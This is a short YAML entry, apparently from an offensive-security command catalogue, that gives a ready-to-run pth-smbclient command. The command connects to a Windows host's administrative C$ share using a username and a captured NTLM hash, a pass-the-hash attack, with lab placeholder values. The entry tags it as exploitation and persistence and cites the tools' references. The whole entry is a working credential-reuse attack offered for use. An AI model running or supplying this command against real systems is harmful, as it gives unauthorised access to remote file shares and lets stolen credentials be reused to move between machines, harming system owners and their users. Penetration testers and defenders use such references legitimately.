---
description: Connect to an SMB share on a remote Windows host using smbclient with NTLM Pass-the-Hash.

Command Reference:
    Target IP: 10.10.10.1
    Domain: test.local
    Username: john
    Hash: 580B16D486D8D2CAFA00B314D41FA396 (NTLM hash)

command: |
  pth-smbclient -U test.local/john%00000000000000000000000000000000:580B16D486D8D2CAFA00B314D41FA396 //10.10.10.1/C$

items:
  - Hash

services:
  - SMB
  - NTLM

OS:
  - Windows

attack_types:
  - Exploitation
  - Persistence

references:
  - https://www.samba.org/samba/docs/current/man-html/smbclient.1.html
  - https://github.com/byt3bl33d3r/pth-toolkit
  - https://learn.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview
---
